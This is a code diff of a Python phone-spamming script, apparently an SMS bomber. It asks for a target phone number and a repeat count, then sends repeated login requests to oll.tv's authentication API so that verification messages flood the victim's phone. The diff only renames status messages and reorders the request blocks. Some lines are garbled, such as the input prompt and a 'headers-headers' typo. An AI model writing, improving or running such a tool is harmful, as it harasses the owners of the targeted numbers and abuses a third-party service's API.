@@ -45,25 +45,22 @@ number = input('[green]Beeante HOMeP tenedona: (бes + ')
 run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-     print('Отправлено')
+     print('1')
      response = requests.post('https://oll.tv/api/v3/auth/login?lang=rus', headers=headers, data={'phone': "+" + NUMBER})
  except:
-     print('Не доставлено')
-
+     print('11')
  try:
-     print('Отправлено')
-     response = requests.post('https://oll.tv/api/v3/auth/login?lang=rus', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-
- try:
-     print('Отправлено')
-     response = requests.post('https://oll.tv/api/v3/auth/login?lang=rus', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-
- try:
-     print('Отправлено')
+     print('2')
      response = requests.post('https://oll.tv/api/v3/auth/login?lang=rus', headers=headers, json={'phone' :  NUMBER})
  except:
-     print('Не доставлено')
+     print('22')
+ try:
+     print('3')
+     response = requests.post('https://oll.tv/api/v3/auth/login?lang=rus', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('33')
+ try:
+     print('4')
+     response = requests.post('https://oll.tv/api/v3/auth/login?lang=rus', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('44')
